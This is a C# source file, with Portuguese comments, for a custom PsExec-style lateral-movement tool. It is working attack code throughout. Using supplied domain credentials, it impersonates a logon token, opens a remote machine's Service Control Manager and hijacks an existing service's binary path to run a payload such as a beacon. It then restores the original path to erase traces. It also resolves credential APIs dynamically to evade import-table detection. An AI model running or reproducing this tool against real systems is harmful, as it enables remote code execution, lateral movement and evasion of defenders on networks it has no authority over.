using System;
using System.Runtime.InteropServices;
using System.Threading;

namespace CustomPsExec
{
    class Program
    {
        // --- Constantes OPSEC e SCM ---
        const int LOGON32_LOGON_NEW_CREDENTIALS = 9;
        const int LOGON32_PROVIDER_DEFAULT = 0;
        const uint SC_MANAGER_ALL_ACCESS = 0xF003F;
        const uint SERVICE_ALL_ACCESS = 0xF01FF;
        const uint SERVICE_NO_CHANGE = 0xffffffff;
        const int SERVICE_DEMAND_START = 3;

        // --- P/Invoke: SCM & Service Management ---
        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenSCManagerW(string machineName, string databaseName, uint dwAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr OpenServiceW(IntPtr hSCManager, string lpServiceName, uint dwDesiredAccess);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool QueryServiceConfigW(IntPtr hService, IntPtr lpServiceConfig, uint cbBufSize, out uint pcbBytesNeeded);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool ChangeServiceConfigW(IntPtr hService, uint dwServiceType, uint dwStartType, uint dwErrorControl, string lpBinaryPathName, string lpLoadOrderGroup, IntPtr lpdwTagId, string lpDependencies, string lpServiceStartName, string lpPassword, string lpDisplayName);

        [DllImport("advapi32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern bool StartServiceW(IntPtr hService, int dwNumServiceArgs, string[] lpServiceArgVectors);

        [DllImport("advapi32.dll", SetLastError = true)]
        [return: MarshalAs(UnmanagedType.Bool)]
        public static extern bool CloseServiceHandle(IntPtr hSCObject);

        // --- P/Invoke: Resolução Dinâmica Básica ---
        [DllImport("kernel32.dll", CharSet = CharSet.Unicode, SetLastError = true)]
        public static extern IntPtr LoadLibraryW(string lpFileName);

        [DllImport("kernel32.dll", CharSet = CharSet.Ansi, SetLastError = true)]
        public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

        [DllImport("kernel32.dll", CharSet = CharSet.Auto)]
        public static extern IntPtr GetModuleHandle(string lpModuleName);

        // --- Estruturas ---
        [StructLayout(LayoutKind.Sequential)]
        public struct QUERY_SERVICE_CONFIG
        {
            public uint dwServiceType;
            public uint dwStartType;
            public uint dwErrorControl;
            public IntPtr lpBinaryPathName;
            public IntPtr lpLoadOrderGroup;
            public uint dwTagId;
            public IntPtr lpDependencies;
            public IntPtr lpServiceStartName;
            public IntPtr lpDisplayName;
        }

        // --- Delegates para Token Manipulation ---
        [UnmanagedFunctionPointer(CallingConvention.StdCall, CharSet = CharSet.Unicode)]
        private delegate bool LogonUserW_Delegate(string lpszUsername, string lpszDomain, string lpszPassword, int dwLogonType, int dwLogonProvider, out IntPtr phToken);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool ImpersonateLoggedOnUser_Delegate(IntPtr hToken);

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool RevertToSelf_Delegate();

        [UnmanagedFunctionPointer(CallingConvention.StdCall)]
        private delegate bool CloseHandle_Delegate(IntPtr hObject);

        static void Main(string[] args)
        {
            if (args.Length < 6)
            {
                Console.WriteLine("[!] Uso: CustomPsExec.exe <alvo> <servico_alvo> <payload> <dominio> <usuario> <senha>");
                Console.WriteLine("[i] Ex : CustomPsExec.exe dc01.lab.local SensorService \"C:\\Windows\\Temp\\beacon.exe\" lab.local svc_admin P@ssw0rd1");
                return;
            }

            string target = args[0];
            string serviceName = args[1];
            string payload = args[2];
            string domain = args[3];
            string user = args[4];
            string password = args[5];

            // 1. Setup Dinâmico das APIs de Token (Evasão de IAT para credenciais)
            IntPtr hAdvapi32 = LoadLibraryW("advapi32.dll");
            IntPtr pLogonUser = GetProcAddress(hAdvapi32, "LogonUserW");
            IntPtr pImpersonate = GetProcAddress(hAdvapi32, "ImpersonateLoggedOnUser");
            IntPtr pRevert = GetProcAddress(hAdvapi32, "RevertToSelf");
            IntPtr pCloseHandle = GetProcAddress(GetModuleHandle("kernel32.dll"), "CloseHandle");

            var dLogonUser = Marshal.GetDelegateForFunctionPointer<LogonUserW_Delegate>(pLogonUser);
            var dImpersonate = Marshal.GetDelegateForFunctionPointer<ImpersonateLoggedOnUser_Delegate>(pImpersonate);
            var dRevert = Marshal.GetDelegateForFunctionPointer<RevertToSelf_Delegate>(pRevert);
            var dCloseHandle = Marshal.GetDelegateForFunctionPointer<CloseHandle_Delegate>(pCloseHandle);

            IntPtr hToken = IntPtr.Zero;

            // 2. Logon Local com Outbound Credentials (Type 9)
            Console.WriteLine($"[*] Autenticando {domain}\\{user} via LOGON32_LOGON_NEW_CREDENTIALS...");
            if (!dLogonUser(user, domain, password, LOGON32_LOGON_NEW_CREDENTIALS, LOGON32_PROVIDER_DEFAULT, out hToken) || hToken == IntPtr.Zero)
            {
                Console.WriteLine("[-] Falha no LogonUserW.");
                return;
            }

            // 3. Impersonate da Thread
            if (dImpersonate(hToken))
            {
                Console.WriteLine("[+] Contexto da thread alterado com sucesso.");

                try
                {
                    // 4. Conexão RPC/SMB com o alvo usando o novo token
                    Console.WriteLine($"[*] Abrindo SCM em \\\\{target}...");
                    IntPtr scmHandle = OpenSCManagerW(target, null, SC_MANAGER_ALL_ACCESS);
                    if (scmHandle == IntPtr.Zero)
                    {
                        Console.WriteLine($"[-] Falha ao acessar SCM. Erro: {Marshal.GetLastWin32Error()}");
                        return;
                    }

                    Console.WriteLine($"[*] Abrindo serviço '{serviceName}'...");
                    IntPtr svcHandle = OpenServiceW(scmHandle, serviceName, SERVICE_ALL_ACCESS);
                    if (svcHandle == IntPtr.Zero)
                    {
                        Console.WriteLine($"[-] Falha ao abrir serviço. Erro: {Marshal.GetLastWin32Error()}");
                        CloseServiceHandle(scmHandle);
                        return;
                    }

                    // 5. Query Configuração Original (OPSEC)
                    uint bytesNeeded;
                    QueryServiceConfigW(svcHandle, IntPtr.Zero, 0, out bytesNeeded);
                    IntPtr qscPtr = Marshal.AllocHGlobal((int)bytesNeeded);

                    if (QueryServiceConfigW(svcHandle, qscPtr, bytesNeeded, out bytesNeeded))
                    {
                        QUERY_SERVICE_CONFIG originalConfig = (QUERY_SERVICE_CONFIG)Marshal.PtrToStructure(qscPtr, typeof(QUERY_SERVICE_CONFIG));
                        string originalPath = Marshal.PtrToStringUni(originalConfig.lpBinaryPathName);
                        Console.WriteLine($"[+] Configuração original salva: {originalPath}");

                        // 6. Hijack - Alterando binário do serviço
                        Console.WriteLine($"[*] Injetando payload: {payload}");
                        if (ChangeServiceConfigW(svcHandle, SERVICE_NO_CHANGE, SERVICE_DEMAND_START, SERVICE_NO_CHANGE, payload, null, IntPtr.Zero, null, null, null, null))
                        {
                            // 7. Trigger da Execução
                            Console.WriteLine("[*] Disparando StartServiceW...");
                            StartServiceW(svcHandle, 0, null);

                            // Race condition control - aguarda o binário dar spawn
                            Thread.Sleep(2000);

                            // 8. Restauração (Limpeza de rastros)
                            Console.WriteLine("[*] Restaurando caminho original no SCM...");
                            ChangeServiceConfigW(svcHandle, SERVICE_NO_CHANGE, originalConfig.dwStartType, SERVICE_NO_CHANGE, originalPath, null, IntPtr.Zero, null, null, null, null);
                            Console.WriteLine("[+] Sucesso. Rastro de configuração limpo.");
                        }
                        else
                        {
                            Console.WriteLine($"[-] Falha no ChangeServiceConfigW. Erro: {Marshal.GetLastWin32Error()}");
                        }
                    }
                    else
                    {
                        Console.WriteLine("[-] Falha ao ler configuração original. Abortando para evitar quebra do serviço.");
                    }

                    Marshal.FreeHGlobal(qscPtr);
                    CloseServiceHandle(svcHandle);
                    CloseServiceHandle(scmHandle);
                }
                finally
                {
                    // 9. RevertToSelf OBRIGATÓRIO
                    Console.WriteLine("[*] Executando RevertToSelf...");
                    dRevert();
                }
            }

            dCloseHandle(hToken);
            Console.WriteLine("[+] Operação finalizada.");
        }
    }
}
